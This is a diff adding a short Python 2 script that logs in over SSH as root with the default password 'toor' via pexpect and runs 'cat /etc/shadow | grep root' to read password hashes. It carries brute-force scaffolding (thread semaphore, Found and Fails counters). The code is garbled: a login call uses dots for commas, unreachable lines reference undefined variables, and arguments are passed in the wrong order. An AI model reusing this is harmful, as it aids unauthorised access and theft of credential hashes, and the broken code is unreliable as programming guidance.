@@ -1,0 +1,46 @@
+import pexpect
+import pexpect.pxssh
+import optparse
+import time
+from threading import *
+maxConnections = 5
+connection_lock = BoundedSemaphore(value=maxConnections)
+Found = False
+Fails = 0
+
+PROMPT = ['# ','>>> ','> ','\$ ']
+def send_command(s, cmd):
+    s.sendline(cmd)
+    s.expect(PROMPT)
+    print s.before
+
+def connect(host,user, password):
+    try:
+        s = pxssh.pxssh()
+        s.login(host. user. password)
+        return s
+    except:
+        print '[-] Error Connecting'
+        exit(0)
+    s = connect('127.0.0.1','root','toor')
+    send_command(s,'cat /etc/shadow | grep root')
+    if ret == 0:
+        print '[-] Error connecting'
+        return
+    if ret == 1:
+        child.sendline('yes')
+        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:' ])
+        if ret == 0:
+            print '[-] Error connecting'
+            return
+        child.sendline(password)
+        child.expect(PROMPT)
+        return child
+def main():
+    host = 'localhost'
+    user='root'
+    password='toor'
+    child = connect(user, host, password)
+    send_command(child,'cat /etc/shadow | grep root')
+if __name__ == '__main__':
+    main()
